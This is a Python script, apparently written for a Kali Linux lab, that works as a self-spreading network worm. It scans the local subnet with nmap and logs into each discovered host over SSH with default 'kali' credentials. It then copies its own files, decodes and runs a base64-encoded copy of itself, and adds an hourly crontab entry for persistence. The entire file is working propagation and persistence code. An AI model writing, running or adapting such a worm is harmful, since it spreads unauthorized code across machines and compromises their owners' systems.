#!usr/bin/env python3

import subprocess
import os
import paramiko
import base64

Current_IP = ''
nmap_scan = ''
FULLsend = []
def Make_file(): 
    with open("/home/kali/Desktop/rickster", "w") as f:
        f.write("ricky was definetly here")

def My_IP(): # gives current IP
    result = subprocess.run('hostname -I', shell=True, stdout=subprocess.PIPE)
    response = result.stdout.decode('utf-8')
    response = response.strip('\n').split(' ')
    for i in response:
        i_1 = i.split('.')
        if len(i_1[0]) >= 3:
            Current_IP = i
    return Current_IP

def Subnet_IP(Current_IP): #returns cidr notation of IP
    ip_index = Current_IP.rfind('.')
    cidr_not = Current_IP[0:ip_index+1]+'1/24'
    return cidr_not

def Scan(cidr_not): #runs nmap scan
    run_nmap = True
    while run_nmap==True:
        result = subprocess.run(['nmap','-sn',cidr_not],stdout=subprocess.PIPE)
        nmap_scan = result.stdout.decode('utf-8')
        run_nmap = False
    return nmap_scan

def list_assoc(nmap_scan,Current_IP):# gives list of IPs
    print(f'this is current ip = {Current_IP}')
    print(f'this is nmap list = {nmap_scan}')
    scan = nmap_scan.split('\n')
    for i in scan:
        if 'Nmap scan report for' in i:
            address = i[21::1]
            FULLsend.append(address)
        if Current_IP in FULLsend:
            FULLsend.remove(Current_IP)
    return FULLsend

def based64(): # get base64 of py
    with open("/home/kali/Desktop/RickyFiles/RickiestRick.py", "rb") as f:
        code_content = f.read()
        rickyencoded = base64.b64encode(code_content)
        return rickyencoded.decode("ascii")


def ssh(FULLsend, rickyencoded, Current_IP): # SSH Connection, Transfers Desktop file, adds running it to crontab
    while True:
        for i in FULLsend:
            try:
                print(i)
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(i, username='kali',password='kali')
                sftp = ssh.open_sftp()
                try:
                    sftp.stat('home/kali/Desktop/RickyFiles')
                    print('The file exists on the target machine.')
                except FileNotFoundError:
                    print('The file does not exist on the target machine. Making Now.')
                    sftp.mkdir('/home/kali/Desktop/RickyFiles')
                    for file in os.listdir("/home/kali/Desktop/RickyFiles"):
                        sftp.put(os.path.join("/home/kali/Desktop/RickyFiles", file), os.path.join("/home/kali/Desktop/RickyFiles", file)) 
                    ssh.exec_command(f'cd Desktop && echo {rickyencoded} | base64 -d > RickRoss.py && python3 RickRoss.py > Err.txt')
                    cron_command = "0 * * * * python3 /home/kali/Desktop/RickyFiles/RickiestRick.py"
                    stdin, stdout, stderr = ssh.exec_command('echo "$(crontab -l ; echo "'+cron_command+'")" | crontab -')
                    break
                    #Echo <code> | base64 -d > file && python3 file
            except Exception as E:
                print(E)
                continue
        sftp.close()
        ssh.close()


#subrpocess.run("*/15 * * * * python3 /home/kali/Desktop/RickyFiles/RickiestRick.py", shell=True)
def main():
    Make_file()

    Current_IP = My_IP()
    print(f"Current IP = {Current_IP}")

    cidr_not = Subnet_IP(Current_IP)
    print(f"Cider Notation = {cidr_not}")

    nmap_scan = Scan(cidr_not)
    print(f"Nmap Output = {nmap_scan}")

    FULLsend = list_assoc(nmap_scan, Current_IP)
    print(f"List of IPs = {FULLsend}")

    based = based64()
    print(f"this is the base64 code = {based}")

    ssh(FULLsend, based, Current_IP)
   

    # maybe = Runnitagain
    # print(maybe)


if __name__ == '__main__':
    main()